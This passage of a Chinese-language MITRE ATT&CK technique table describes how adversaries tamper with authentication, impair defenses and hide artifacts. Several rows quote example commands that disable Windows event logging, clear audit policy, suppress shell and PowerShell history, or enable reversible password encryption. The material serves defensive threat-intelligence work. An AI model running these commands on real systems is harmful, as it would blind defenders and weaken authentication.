| [T1556.004](../techniques/T1556.004.md) | 网络设备认证 | 对手可能使用[修补系统镜像](https://attack.mitre.org/techniques/T1601/001)在操作系统中硬编码密码，从而绕过网络设备本地账户的本机认证机制。  [修改系统镜像](https://attack.mitre.org/techniques/T1601)可能包括在网络设备的操作系统中植入代码，以便对手使用特定密码进行访问。修改包括通过修补在操作系统镜像中植入特定密码。认证尝试时，插入的代码将首先检查用户输入是否为密码。如果是，则授予访问权限。否则，植入的代码将传递凭据以验证可能有效的凭据。(引用: Mandiant - Synful Knock) |
| [T1556.005](../techniques/T1556.005.md) | 可逆加密 | 对手可能会滥用 Active Directory 认证加密属性，以获取 Windows 系统上的凭据。<code>AllowReversiblePasswordEncryption</code> 属性指定是否启用或禁用账户的可逆密码加密。默认情况下，此属性被禁用（而是将用户凭据存储为单向哈希函数的输出），除非需要遗留或其他软件，否则不应启用。(引用: store_pwd_rev_enc)  如果启用此属性和/或用户在启用后更改其密码，对手可能能够获取在启用此属性后创建/更改的密码的明文。要解密密码，对手需要四个组件：  1. 来自 Active Directory 用户结构 <code>userParameters</code> 的加密密码 (<code>G$RADIUSCHAP</code>) 2. 也是来自 <code>userParameters</code> 的 16 字节随机生成值 (<code>G$RADIUSCHAPKEY</code>) 3. 全局 LSA 密钥 (<code>G$MSRADIUSCHAPKEY</code>) 4. 硬编码在远程访问子认证 DLL (<code>RASSFM.DLL</code>) 中的静态密钥  有了这些信息，对手可能能够重现加密密钥，并随后解密加密的密码值。(引用: how_pwd_rev_enc_1)(引用: how_pwd_rev_enc_2)  对手可能通过本地组策略编辑器、用户属性、细粒度密码策略 (FGPP) 或通过 ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) 模块在各种范围内设置此属性。例如，如果域功能级别设置为“Windows Server 2008”或更高，对手可能会实施并应用 FGPP 到用户或组。(引用: dump_pwd_dcsync) 在 PowerShell 中，对手可能使用类似 <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code> 的命令对用户设置进行相关更改。 |
| [T1556.006](../techniques/T1556.006.md) | 多因素认证 | 对手可能会禁用或修改多因素认证 (MFA) 机制，以便对被破坏的账户进行持久访问。  一旦对手通过破坏缺乏 MFA 的账户或使用 MFA 绕过方法（例如[多因素认证请求生成](https://attack.mitre.org/techniques/T1621)）获得对网络的访问权限，对手可能会利用其访问权限修改或完全禁用 MFA 防御。这可以通过滥用合法功能来实现，例如将用户排除在 Azure AD 条件访问策略之外，注册新的但易受攻击/对手控制的 MFA 方法，或通过手动修补 MFA 程序和配置文件以绕过预期功能。(引用: Mandiant APT42)(引用: Azure AD 条件访问排除)  例如，修改 Windows 主机文件 (`C:\windows\system32\drivers\etc\hosts`) 以将 MFA 调用重定向到本地主机而不是 MFA 服务器，可能会导致 MFA 过程失败。如果存在“失败开放”策略，则任何其他成功的身份验证尝试可能会在不强制执行 MFA 的情况下被授予访问权限。(引用: 俄罗斯人利用默认 MFA 协议 - CISA 2022 年 3 月)  根据对手的范围、目标和权限，MFA 防御可能会针对单个账户或与更大组相关的所有账户（例如受害者网络环境中的所有域账户）被禁用。(引用: 俄罗斯人利用默认 MFA 协议 - CISA 2022 年 3 月) |
| [T1556.007](../techniques/T1556.007.md) | 混合身份 | 对手可能会修补、修改或以其他方式后门化与本地用户身份相关联的云身份验证过程，以绕过典型的身份验证机制、访问凭据并启用对账户的持久访问。  许多组织维护在本地和云环境之间共享的混合用户和设备身份。这些身份可以通过多种方式维护。例如，Microsoft Entra ID包括三种同步Active Directory和Entra ID之间身份的选项(引用: Azure AD Hybrid Identity)：  * 密码哈希同步（PHS），其中特权本地账户同步用户密码哈希值，使Entra ID的身份验证完全在云中进行 * 直通身份验证（PTA），其中Entra ID身份验证尝试被转发到本地PTA代理，该代理根据Active Directory验证凭据 * Active Directory联合服务（AD FS），其中在Active Directory和Entra ID之间建立信任关系  AD FS还可以与其他SaaS和云平台（如AWS和GCP）一起使用，这些平台将身份验证过程交给AD FS并接收包含混合用户身份和权限的令牌。  通过修改与混合身份相关的身份验证过程，对手可能能够建立对云资源的持久特权访问。例如，妥协运行PTA代理的本地服务器的对手可能会将恶意DLL注入`AzureADConnectAuthenticationAgentService`进程，该进程授权所有尝试对Entra ID进行身份验证的请求，并记录用户凭据。(引用: Azure AD Connect for Read Teamers)(引用: AADInternals Azure AD On-Prem to Cloud) 在使用AD FS的环境中，对手可能会编辑`Microsoft.IdentityServer.Servicehost`配置文件以加载生成任何用户的身份验证令牌的恶意DLL，从而绕过多因素认证和定义的AD FS策略。(引用: MagicWeb)  在某些情况下，对手可能能够从云端修改混合身份身份验证过程。例如，妥协Entra ID租户中的全局管理员账户的对手可能能够通过Web控制台注册新的PTA代理，从而允许他们收集凭据并以任何用户身份登录Entra ID环境。(引用: Mandiant Azure AD Backdoors) |
| [T1556.008](../techniques/T1556.008.md) | 网络提供程序 DLL | 对手可能会注册恶意的网络提供程序动态链接库 (DLL)，以在身份验证过程中捕获明文用户凭据。网络提供程序 DLL 允许 Windows 与特定网络协议接口，并且还可以支持附加的凭据管理功能。(引用: Network Provider API) 在登录过程中，Winlogon（交互式登录模块）通过 RPC 将凭据发送到本地的 `mpnotify.exe` 进程。`mpnotify.exe` 进程在通知发生登录事件时，将明文凭据与注册的凭据管理器共享。(引用: NPPSPY - Huntress)(引用: NPPSPY Video)(引用: NPLogonNotify)  对手可以配置恶意的网络提供程序 DLL 以从 `mpnotify.exe` 接收凭据。(引用: NPPSPY) 一旦作为凭据管理器安装（通过注册表），恶意 DLL 可以在每次用户登录到 Windows 工作站或域时通过 `NPLogonNotify()` 函数接收并保存凭据。(引用: NPLogonNotify)  对手可能会将恶意的网络提供程序 DLL 植入已知具有较多登录活动和/或管理员登录活动的系统上，例如服务器和域控制器。(引用: NPPSPY - Huntress) |
| [T1556.009](../techniques/T1556.009.md) | 条件访问策略 | 对手可能会禁用或修改条件访问策略，以确保对被破坏账户的持久访问。条件访问策略是身份提供者和身份和访问管理系统用于确定用户是否应被授予资源访问权限的额外验证。  例如，在Entra ID、Okta和JumpCloud中，可以根据用户的IP地址、设备注册状态和多因素认证的使用情况拒绝用户访问应用程序。(引用: Microsoft Conditional Access)(引用: JumpCloud Conditional Access Policies)(引用: Okta Conditional Access Policies) 在某些情况下，身份提供者还可能支持使用基于风险的指标，根据各种指标拒绝登录。在AWS和GCP中，IAM策略可以包含`condition`属性，以验证任意约束，例如源IP、请求日期以及请求的资源或区域的性质。(引用: AWS IAM Conditions)(引用: GCP IAM Conditions) 这些措施有助于防止被破坏的凭据导致未经授权的数据或资源访问，并将用户权限限制在仅所需的权限。  通过修改条件访问策略，例如添加额外的受信任IP范围、删除[多因素认证](https://attack.mitre.org/techniques/T1556/006)要求或允许额外的[未使用/不受支持的云区域](https://attack.mitre.org/techniques/T1535)，对手可能能够确保对账户的持久访问并规避防御措施。 |
| [T1562](../techniques/T1562.md) | 削弱防御 | 对手可能会恶意修改受害者环境的组件，以阻碍或禁用防御机制。这不仅涉及削弱预防性防御措施，例如防火墙和防病毒，还包括检测能力，防御者可以使用这些能力来审计活动和识别恶意行为。这也可能包括本地防御以及用户和管理员安装的补充功能。  对手还可能削弱有助于防御卫生的常规操作，例如阻止用户注销、阻止系统关闭或禁用或修改更新过程。对手还可能针对事件聚合和分析机制，或通过更改其他系统组件来破坏这些程序。这些限制可以进一步支持恶意操作以及事件的持续传播。(引用: Google Cloud Mandiant UNC3886 2024)(引用: Emotet shutdown)   |
| [T1562.001](../techniques/T1562.001.md) | 禁用或修改工具 | 对手可能会修改和/或禁用安全工具，以避免其恶意软件/工具和活动被检测到。这可能采取多种形式，例如终止安全软件进程或服务，修改/删除注册表键或配置文件，使工具无法正常运行，或其他干扰安全工具扫描或报告信息的方法。对手还可能禁用更新，防止最新的安全补丁到达受害者系统上的工具。(引用: SCADAfence_ransomware)  对手还可能篡改安全工具部署和使用的工件。安全工具可能会对系统组件进行动态更改，以保持对特定事件的可见性。类似于[指标阻断](https://attack.mitre.org/techniques/T1562/006)，对手可能取消挂钩或以其他方式修改工具添加的这些功能（尤其是那些存在于用户态或对手可能访问的功能），以避免检测。(引用: OutFlank System Calls)(引用: MDSec System Calls)   对手还可能专注于特定应用程序，如Sysmon。例如，<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sysmon-Operational</code>中的“Start”和“Enable”值可能被修改，以篡改和可能禁用Sysmon日志记录。(引用: disable_win_evt_logging)   在网络设备上，对手可能尝试通过更改启动配置文件跳过数字签名验证检查，从而有效地禁用通常在启动时进行的固件验证。(引用: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(引用: Analysis of FG-IR-22-369)  在云环境中，对手禁用的工具可能包括向AWS CloudWatch或Google Cloud Monitor等服务报告的云监控代理。  此外，尽管防御工具可能具有防篡改机制，对手可能滥用合法的rootkit移除工具来削弱和/或禁用这些工具。(引用: chasing_avaddon_ransomware)(引用: dharma_ransomware)(引用: demystifying_ryuk)(引用: doppelpaymer_crowdstrike) 例如，对手已使用GMER等工具查找并关闭受感染系统上的隐藏进程和防病毒软件。(引用: demystifying_ryuk)  此外，对手可能利用防病毒软件的合法驱动程序访问内核空间（即[利用权限提升](https://attack.mitre.org/techniques/T1068)），这可能导致绕过防篡改功能。(引用: avoslocker_ransomware) |
| [T1562.002](../techniques/T1562.002.md) | 禁用Windows事件日志记录 | 对手可能会禁用Windows事件日志记录，以限制可用于检测和审计的数据。Windows事件日志记录用户和系统活动，如登录尝试、进程创建等。(引用: Windows Log Events) 这些数据被安全工具和分析师用来生成检测。  EventLog服务维护来自各种系统组件和应用程序的事件日志。(引用: EventLog_Core_Technologies) 默认情况下，服务在系统启动时自动启动。由本地安全策略（secpol.msc）维护的审核策略定义了EventLog服务记录的系统事件。可以通过运行secpol.msc，然后导航到<code>Security Settings\Local Policies\Audit Policy</code>以获取基本审核策略设置，或<code>Security Settings\Advanced Audit Policy Configuration</code>以获取高级审核策略设置来更改安全审核策略设置。(引用: Audit_Policy_Microsoft)(引用: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code>也可以用来设置审核策略。(引用: auditpol)  对手可能会针对系统范围的日志记录或特定应用程序的日志记录。例如，可以使用<code>Set-Service -Name EventLog -Status Stopped</code>或<code>sc config eventlog start=disabled</code>命令禁用Windows EventLog服务（然后手动停止服务，使用<code>Stop-Service -Name EventLog</code>）。(引用: Disable_Win_Event_Logging)(引用: disable_win_evt_logging) 此外，可以通过修改<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog</code>中的“Start”值，然后重新启动系统以使更改生效来禁用服务。(引用: disable_win_evt_logging)  有几种方法可以通过注册表项修改禁用EventLog服务。首先，在没有管理员权限的情况下，对手可以修改<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security</code>键中的“Start”值，然后重新启动系统以禁用安全事件日志。(引用: winser19_file_overwrite_bug_twitter) 其次，具有管理员权限的对手可以修改<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System</code>和<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application</code>中的相同值，以禁用整个事件日志。(引用: disable_win_evt_logging)  此外，对手可能会使用<code>auditpol</code>及其子命令在命令提示符中禁用审核或清除审核策略。为了启用或禁用指定的设置或审核类别，对手可能会使用<code>/success</code>或<code>/failure</code>参数。例如，<code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code>关闭帐户登录类别的审核。(引用: auditpol.exe_STRONTIC)(引用: T1562.002_redcanaryco) 要清除审核策略，对手可能会运行以下命令：<code>auditpol /clear /y</code>或<code>auditpol /remove /allusers</code>。(引用: T1562.002_redcanaryco)  通过禁用Windows事件日志记录，对手可以在留下更少的证据的情况下进行操作。 |
| [T1562.003](../techniques/T1562.003.md) | 削弱命令历史记录日志 | 对手可能会削弱命令历史记录日志，以隐藏他们在受损系统上运行的命令。各种命令解释器会跟踪用户在终端中输入的命令，以便用户可以回溯他们的操作。  在 Linux 和 macOS 上，命令历史记录保存在由环境变量 <code>HISTFILE</code> 指向的文件中。当用户注销系统时，此信息会刷新到用户主目录中的 <code>~/.bash_history</code> 文件中。环境变量 <code>HISTCONTROL</code> 跟踪应该由 <code>history</code> 命令保存的内容，并最终在用户注销时保存到 <code>~/.bash_history</code> 文件中。<code>HISTCONTROL</code> 在 macOS 上默认不存在，但可以由用户设置并会被尊重。  对手可能会清除历史记录环境变量（<code>unset HISTFILE</code>）或将命令历史记录大小设置为零（<code>export HISTFILESIZE=0</code>）以防止命令记录。此外，<code>HISTCONTROL</code> 可以配置为忽略以空格开头的命令，只需将其设置为“ignorespace”。<code>HISTCONTROL</code> 还可以设置为忽略重复的命令，将其设置为“ignoredups”。在某些 Linux 系统中，默认设置为“ignoreboth”，涵盖了前面的两个示例。这意味着“ ls”不会被保存，但“ls”会被历史记录保存。对手可以滥用这一点，通过在所有终端命令前加上空格来操作而不留下痕迹。  在 Windows 系统上，<code>PSReadLine</code> 模块跟踪所有 PowerShell 会话中使用的命令，并将它们写入文件（默认情况下为 <code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>）。对手可以使用 <code>Set-PSReadLineOption -HistorySavePath {File Path}</code> 更改这些日志的保存位置。这将导致 <code>ConsoleHost_history.txt</code> 停止接收日志。此外，可以使用 PowerShell 命令 <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code> 关闭对该文件的日志记录。(引用: Microsoft PowerShell Command History)(引用: Sophos PowerShell command audit)(引用: Sophos PowerShell Command History Forensics)  对手还可能利用网络设备上的 [网络设备 CLI](https://attack.mitre.org/techniques/T1059/008) 禁用历史命令日志记录（例如 <code>no logging</code>）。 |
| [T1562.004](../techniques/T1562.004.md) | 禁用或修改系统防火墙 | 对手可能会禁用或修改系统防火墙，以绕过限制网络使用的控制。更改可能包括禁用整个机制以及添加、删除或修改特定规则。这可以通过多种方式完成，具体取决于操作系统，包括通过命令行、编辑Windows注册表项和Windows控制面板。  修改或禁用系统防火墙可能使对手的C2通信、横向移动和/或数据外传得以进行，否则这些操作将不被允许。例如，对手可能会为知名协议（如RDP）添加新的防火墙规则，使用非传统且可能安全性较低的端口（即[非标准端口](https://attack.mitre.org/techniques/T1571)）。(引用: change_rdp_port_conti)  对手还可能修改主机网络设置，间接操纵系统防火墙，例如接口带宽或网络连接请求阈值。(引用: Huntress BlackCat) 与启用滥用各种[远程服务](https://attack.mitre.org/techniques/T1021)相关的设置也可能间接修改防火墙规则。 |
| [T1562.006](../techniques/T1562.006.md) | 指标阻断 | 对手可能会尝试阻止传感器通常捕获的指标或事件被收集和分析。这可能包括恶意重定向(引用: Microsoft Lamin Sept 2017)或甚至禁用主机传感器，例如通过篡改控制事件遥测收集和流动的设置来禁用Windows事件跟踪(ETW)(引用: Microsoft About Event Tracing 2018)。(引用: Medium Event Tracing Tampering 2018) 这些设置可能存储在系统中的配置文件和/或注册表中，也可以通过管理实用程序如[PowerShell](https://attack.mitre.org/techniques/T1059/001)或[Windows管理工具](https://attack.mitre.org/techniques/T1047)访问。  例如，对手可能会修改<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Security</code>中的`File`值，以将其恶意行为隐藏在新的或不同的.evtx日志文件中。此操作不需要系统重启，并立即生效。(引用: disable_win_evt_logging)  ETW中断可以通过多种方式实现，但最直接的方法是使用[PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet定义条件，或直接与注册表交互进行更改。  在网络指标报告的情况下，对手可能会阻止与报告相关的流量，以防止集中分析。这可以通过多种方式实现，例如停止负责转发遥测的本地进程和/或创建主机防火墙规则以阻止特定主机的流量，这些主机负责聚合事件，例如安全信息和事件管理(SIEM)产品。  在Linux环境中，对手可能会禁用或重新配置日志处理工具如syslog或nxlog，以抑制检测和监控能力，以促进后续行为。(引用: LemonDuck) |
| [T1562.007](../techniques/T1562.007.md) | 禁用或修改云防火墙 | 对手可能会禁用或修改云环境中的防火墙，以绕过限制访问云资源的控制。云防火墙与[禁用或修改系统防火墙](https://attack.mitre.org/techniques/T1562/004)中描述的系统防火墙不同。  云环境通常使用限制性安全组和防火墙规则，仅允许来自受信任IP地址的网络活动通过预期的端口和协议。具有适当权限的对手可能会引入新的防火墙规则或策略，以允许进入受害者云环境和/或从云控制平面移动到数据平面。例如，对手可能会使用脚本或实用程序，在现有安全组中创建新的入口规则（或完全创建新的安全组），以允许任何TCP/IP连接到云托管实例。(引用: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022) 他们还可能移除网络限制，以支持与恶意活动（如加密货币挖掘）相关的流量。(引用: Expel IO Evil in AWS)(引用: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)  修改或禁用云防火墙可能使对手的C2通信、横向移动和/或数据外传得以进行，否则这些操作将不被允许。它还可能用于开放资源以进行[暴力破解](https://attack.mitre.org/techniques/T1110)或[端点拒绝服务](https://attack.mitre.org/techniques/T1499)。 |
| [T1562.008](../techniques/T1562.008.md) | 禁用或修改云日志 | 对手可能会禁用或修改云日志记录功能和集成，以限制其活动的数据收集并避免检测。云环境允许收集和分析审计和应用程序日志，这些日志提供了用户在环境中执行的活动的洞察。如果对手拥有足够的权限，他们可以禁用或修改日志记录以避免检测其活动。  例如，在 AWS 中，对手可能会在进行进一步的恶意活动之前禁用 CloudWatch/CloudTrail 集成。(引用: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) 他们也可能篡改日志记录功能——例如，通过删除任何关联的 SNS 主题、禁用多区域日志记录或禁用验证和/或加密日志文件的设置。(引用: AWS Update Trail)(引用: Pacu Detection Disruption Module) 在 Office 365 中，对手可能会使用 `Set-MailboxAuditBypassAssociation` cmdlet 禁用特定用户的邮件收集活动日志记录，禁用 M365 高级审计，或将用户的许可证从企业 E5 降级到企业 E3 许可证。(引用: Dark Reading Microsoft 365 Attacks 2021) |
| [T1562.009](../techniques/T1562.009.md) | 安全模式启动 | 对手可能会滥用 Windows 安全模式来禁用端点防御。安全模式以有限的驱动程序和服务启动 Windows 操作系统。第三方安全软件（如端点检测和响应 (EDR) 工具）可能在安全模式下启动 Windows 后不会启动。安全模式有两个版本：安全模式和带网络的安全模式。可以在安全模式启动后启动其他服务。(引用: Microsoft Safe Mode)(引用: Sophos Snatch Ransomware 2019)  对手可能会滥用安全模式来禁用在有限启动时可能不会启动的端点防御。可以通过修改引导配置数据 (BCD) 存储来强制主机在下次重启后进入安全模式，这些存储是管理引导应用程序设置的文件。(引用: Microsoft bcdedit 2021)  对手还可能通过修改相关注册表值（即[修改注册表](https://attack.mitre.org/techniques/T1112)）将其恶意应用程序添加到安全模式下启动的最小服务列表中。恶意[组件对象模型](https://attack.mitre.org/techniques/T1559/001) (COM) 对象也可能在安全模式下注册和加载。(引用: Sophos Snatch Ransomware 2019)(引用: CyberArk Labs Safe Mode 2016)(引用: Cybereason Nocturnus MedusaLocker 2020)(引用: BleepingComputer REvil 2021) |
| [T1562.010](../techniques/T1562.010.md) | 降级攻击 | 对手可能会降级或使用系统功能的版本，这些版本可能已过时、存在漏洞和/或不支持更新的安全控制。降级攻击通常利用系统的向后兼容性，将其强制为不太安全的操作模式。  对手可能会降级并使用系统功能的各种不太安全的版本，例如[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)或甚至可以被滥用以启用[中间人攻击](https://attack.mitre.org/techniques/T1557)或[网络嗅探](https://attack.mitre.org/techniques/T1040)的网络协议。(引用: Praetorian TLS Downgrade Attack 2014) 例如，[PowerShell](https://attack.mitre.org/techniques/T1059/001) 版本 5+ 包括脚本块日志记录 (SBL)，可以记录执行的脚本内容。然而，对手可能会尝试执行不支持 SBL 的早期版本的 PowerShell，目的是在运行可能被检测到的恶意脚本时[削弱防御](https://attack.mitre.org/techniques/T1562)。(引用: CrowdStrike BGH Ransomware 2021)(引用: Mandiant BYOL 2018)(引用: att_def_ps_logging)  对手可能同样会针对网络流量，从加密的 HTTPS 连接降级到暴露网络数据的非加密 HTTP 连接。(引用: Targeted SSL Stripping Attacks Are Real)(引用: Crowdstrike Downgrade) |
| [T1562.011](../techniques/T1562.011.md) | 伪造安全警报 | 对手可能会伪造来自工具的安全警报，呈现虚假证据以削弱防御者对恶意活动的意识。(引用: BlackBasta) 防御工具生成的消息包含有关潜在安全事件的信息，以及安全软件和系统的运行状态。安全报告消息对于监控系统的正常运行和识别可能表明安全事件的重要事件非常重要。  对手可以伪造安全工具继续运行的正面确认，即使在合法的安全工具已被禁用（例如，[禁用或修改工具](https://attack.mitre.org/techniques/T1562/001)）之后。对手还可以在感染后显示“健康”的系统状态。这可以被滥用以通过延迟防御者的响应来启用进一步的恶意活动。  例如，对手可能会在Windows Defender和其他系统工具被禁用后显示一个伪造的Windows安全GUI和托盘图标，显示“健康”的系统状态。(引用: BlackBasta) |
| [T1562.012](../techniques/T1562.012.md) | 禁用或修改Linux审计系统 | 对手可能会禁用或修改Linux审计系统，以隐藏恶意活动并避免检测。Linux管理员使用Linux审计系统跟踪系统上的安全相关信息。Linux审计系统在内核级别运行，并根据预配置的规则维护应用程序和系统活动（如进程、网络、文件和登录事件）的事件日志。  通常称为`auditd`，这是用于将事件写入磁盘的守护进程的名称，并由`audit.conf`配置文件中设置的参数管理。配置日志生成规则的两种主要方法是通过命令行`auditctl`实用程序和包含一系列`auditctl`命令的文件`/etc/audit/audit.rules`，这些命令在启动时加载。(引用: Red Hat System Auditing)(引用: IzyKnows auditd threat detection 2022)  具有root权限的对手可能能够通过禁用Audit系统服务、编辑配置/规则文件或挂钩Audit系统库函数来确保其活动不被记录。使用命令行，对手可以通过杀死与`auditd`守护进程相关的进程或使用`systemctl`停止Audit服务来禁用Audit系统服务。对手还可以挂钩Audit系统函数以禁用日志记录或修改`/etc/audit/audit.rules`或`audit.conf`文件中的规则以忽略恶意活动。(引用: Trustwave Honeypot SkidMap 2023)(引用: ESET Ebury Feb 2014) |
| [T1564](../techniques/T1564.md) | 隐藏工件 | 对手可能会尝试隐藏与其行为相关的工件以逃避检测。操作系统可能具有隐藏各种工件的功能，例如重要的系统文件和管理任务执行，以避免干扰用户工作环境并防止用户更改系统上的文件或功能。对手可能会滥用这些功能来隐藏工件，例如文件、目录、用户账户或其他系统活动，以逃避检测。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)  对手还可能尝试通过创建与常见安全仪器隔离的计算区域（例如通过使用虚拟化技术）来隐藏与恶意行为相关的工件。(引用: Sophos Ragnar May 2020) |
| [T1564.001](../techniques/T1564.001.md) | 隐藏文件和目录 | 攻击者可能会将文件和目录设置为隐藏，以规避检测机制。为了防止普通用户意外更改系统上的特殊文件，大多数操作系统都有“隐藏”文件的概念。当用户使用GUI浏览文件系统或使用命令行上的普通命令时，这些文件不会显示。用户必须通过一系列图形用户界面（GUI）提示或命令行开关（Windows的<code>dir /a</code>和Linux及macOS的<code>ls –a</code>）明确要求显示隐藏文件。  在Linux和Mac上，用户可以通过在文件或文件夹名称的第一个字符处放置“.”来将特定文件标记为隐藏（引用：Sofacy Komplex Trojan）（引用：Antiquated Mac Malware）。以“.”开头的文件和文件夹默认在Finder应用程序和标准命令行实用程序（如“ls”）中不可见。用户必须专门更改设置才能使这些文件可见。  macOS上的文件也可以标记为UF_HIDDEN标志，这可以防止它们在Finder.app中可见，但仍然允许它们在Terminal.app中可见（引用：WireLurker）。在Windows上，用户可以使用attrib.exe二进制文件将特定文件标记为隐藏。许多应用程序创建这些隐藏文件和文件夹以存储信息，以免杂乱用户的 workspace。例如，SSH实用程序创建一个隐藏的.ssh文件夹，其中包含用户的已知主机和密钥。  攻击者可以利用这一点来隐藏系统上的任何文件和文件夹，并规避不包含隐藏文件调查的典型用户或系统分析。 |
| [T1564.002](../techniques/T1564.002.md) | 隐藏用户 | 对手可能使用隐藏用户来隐藏他们创建或修改的用户账户的存在。管理员可能希望在系统上有许多用户账户时隐藏用户，或者希望将他们的管理或其他管理账户隐藏起来。  在macOS中，对手可以通过操作plist文件、文件夹属性和用户属性来创建或修改隐藏用户。为了防止用户在登录屏幕和系统偏好设置中显示，对手可以将userID设置为500以下，并在<code>/Library/Preferences/com.apple.loginwindow</code> plist文件中将键值<code>Hide500Users</code>设置为<code>TRUE</code>。(引用: Cybereason OSX Pirrit) 每个用户都有一个与之关联的userID。当<code>Hide500Users</code>键值设置为<code>TRUE</code>时，userID低于500的用户不会出现在登录屏幕和系统偏好设置中。使用命令行，对手可以使用<code>dscl</code>实用程序通过将<code>IsHidden</code>属性设置为<code>1</code>来创建隐藏用户账户。对手还可以通过将<code>chflags</code>更改为隐藏来隐藏用户的主文件夹。(引用: Apple Support Hide a User Account)  对手也可能在Windows中类似地隐藏用户账户。对手可以将<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</code>注册表键值设置为<code>0</code>，以防止特定用户出现在登录屏幕上。(引用: FireEye SMOKEDHAM June 2021)(引用: US-CERT TA18-074A)  在Linux系统上，对手可能会隐藏登录屏幕上的用户账户，也称为greeter。对手可能使用的方法取决于发行版当前使用的显示管理器。例如，在使用GNOME显示管理器（GDM）的Ubuntu系统上，可以使用<code>gsettings</code>命令隐藏greeter中的账户（例如：<code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>）。(引用: Hide GDM User Accounts) 显示管理器不固定在特定的发行版上，用户或对手可以更改它们。 |
| [T1564.003](../techniques/T1564.003.md) | 隐藏窗口 | 对手可能会使用隐藏窗口来隐藏恶意活动，使其不被用户察觉。在某些情况下，应用程序执行操作时通常会显示的窗口可以被隐藏。系统管理员可能会利用这些功能在执行管理任务时避免打扰用户工作环境。  对手可能会滥用这些功能来隐藏用户通常可见的窗口，以免用户察觉到对手在系统上的活动。(引用: Antiquated Mac Malware)  在macOS上，应用程序运行的配置列在属性列表（plist）文件中。这些文件中的一个标签可以是<code>apple.awt.UIElement</code>，允许Java应用程序防止应用程序图标出现在Dock中。一个常见的用途是当应用程序在系统托盘中运行，但不希望也出现在Dock中。  类似地，在Windows上，脚本语言（如[PowerShell](https://attack.mitre.org/techniques/T1059/001)、Jscript和[Visual Basic](https://attack.mitre.org/techniques/T1059/005)）中有各种功能可以使窗口隐藏。一个示例是<code>powershell.exe -WindowStyle Hidden</code>。(引用: PowerShell About 2019)  此外，Windows支持`CreateDesktop()` API，可以创建一个隐藏的桌面窗口及其对应的<code>explorer.exe</code>进程。(引用: Hidden VNC)(引用: Anatomy of an hVNC Attack) 在隐藏桌面窗口上运行的所有应用程序（如隐藏的VNC（hVNC）会话）(引用: Hidden VNC)将对其他桌面窗口不可见。 |
| [T1564.004](../techniques/T1564.004.md) | NTFS文件属性 | 攻击者可能使用NTFS文件属性隐藏其恶意数据，以逃避检测。每个NTFS格式的分区都包含一个主文件表（MFT），该表维护分区上每个文件/目录的记录。(Citation: SpectorOps Host-Based Jul 2017) 在MFT条目中，文件属性（如扩展属性（EA）和数据[当存在多个数据属性时称为备用数据流（ADS）]）可用于存储任意数据（甚至完整的文件）。(Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft NTFS File Attributes Aug 2010) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)  攻击者可能将恶意数据或二进制文件存储在文件属性元数据中，而不是直接存储在文件中。这可能是为了逃避某些防御措施，如静态指示符扫描工具和反病毒软件。(Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015) |
| [T1564.005](../techniques/T1564.005.md) | 隐藏文件系统 | 对手可能会使用隐藏文件系统来隐藏用户和安全工具的恶意活动。文件系统提供了一个结构，用于从物理存储中存储和访问数据。通常，用户通过允许他们访问文件和目录的应用程序与文件系统交互，这些文件和目录是其物理位置（例如：磁盘扇区）的抽象。标准文件系统包括FAT、NTFS、ext4和APFS。文件系统还可以包含其他结构，例如NTFS中的卷引导记录(VBR)和主文件表(MFT)。(引用: MalwareTech VFS Nov 2014)  对手可能会使用他们自己的抽象文件系统，与受感染系统上存在的标准文件系统分开。这样，对手可以隐藏恶意组件和文件输入/输出的存在，避免安全工具的检测。隐藏文件系统，有时称为虚拟文件系统，可以通过多种方式实现。一种实现方式是将文件系统存储在磁盘结构或标准文件系统分区未使用的保留磁盘空间中。(引用: MalwareTech VFS Nov 2014)(引用: FireEye Bootkits) 另一种实现方式是对手将自己的便携式分区映像作为文件放在标准文件系统之上。(引用: ESET ComRAT May 2020) 对手还可能以非标准方式在现有文件系统结构中分散文件。(引用: Kaspersky Equation QA) |
| [T1564.006](../techniques/T1564.006.md) | 运行虚拟实例 | 对手可能会使用虚拟实例执行恶意操作以避免检测。存在多种虚拟化技术，可以模拟计算机或计算环境。通过在虚拟实例中运行恶意代码，对手可以隐藏与其行为相关的工件，使安全工具无法监控虚拟实例内的活动。此外，根据虚拟网络实现（例如：桥接适配器），虚拟实例生成的网络流量可能难以追溯到受感染的主机，因为 IP 地址和主机名可能不匹配已知值。(引用: SingHealth Breach Jan 2019)  对手可能会利用虚拟化的本机支持（例如：Hyper-V）或放置运行虚拟实例所需的文件（例如：VirtualBox 二进制文件）。在运行虚拟实例后，对手可能会在来宾和主机之间创建一个共享文件夹，权限允许虚拟实例与主机文件系统交互。(引用: Sophos Ragnar May 2020) |
